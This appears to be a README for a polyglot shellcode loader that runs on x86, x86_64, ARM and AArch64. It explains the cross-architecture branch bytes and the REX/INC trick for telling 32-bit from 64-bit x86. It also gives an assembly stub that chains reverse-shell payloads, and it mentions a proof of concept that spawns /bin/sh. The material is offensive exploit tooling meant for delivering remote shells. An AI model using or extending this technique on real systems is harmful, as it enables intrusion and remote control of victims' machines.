stage0 contains a shellcode that can be successfully executed by the following architectures:
    - x86
    - x86_64
    - arm (little endian)
    - arm_64 (aarch64) (little endian)

To make it work we need:
    - 4 bytes that translate to:
        - valid opcodes for arm, arm64 and x86
        - that evaluate to a jump in x86
        - that are functional nops in both arms (aka no load / store & no touching of PC / LR / stack)
    - 4 more bytes that translate to:
        - valid opcodes for arm and arm64
        - evaluate to a jump in arm
        - functionnal nop for arm64

For the x86 / arm branching we use the following:
0xEB 0xXX 0x00 0x32     (with XX being the offset to x86 code)
    arm       andlo   r0, r0, #0xeb000
    arm64     orr     w11, w23, #7
    x86       jmp     $+0xa / junk
    x86_64    jmp     $+0xa / junk

For the arm / arm64 branching we use:
0xXX 0xXX 0xXX 0xEA
    arm       b       XXX
    arm64     ands    x1, x0, x0

(exact decoded instructions will change based on the offset values)

We differenciate between x86 32 and 64 bits by using the REX + NOP / INC trick.
After that we just jump to arch specific payloads.
If the code is running in x86 mode, the CPU will execute this.

//
  /* 0000 */ "\x31\xc0" /* xor eax, eax */
  /* 0002 */ "\x40"     /* inc eax      */
  /* 0003 */ "\x74\x08" /* jz 0xd       */

But in x64 mode, will see this:

//
  /* 0000 */ "\x31\xc0"     /* xor eax, eax */
  /* 0002 */ "\x40\x74\x08" /* jz 0xd       */

So combining the 2 reverse shells for example, you can use the following:

bits 32
    
    xor    eax, eax
    inc    eax
    jz     x64
    
%include "rs32.asm"
    
    push   1                 ; sys_exit
    pop    eax
    int    0x80
x64:

%include "rs64.asm"


You can use the poc.asm to get a /bin/sh shellcode compatible with all those archs (it contains nulls thought)
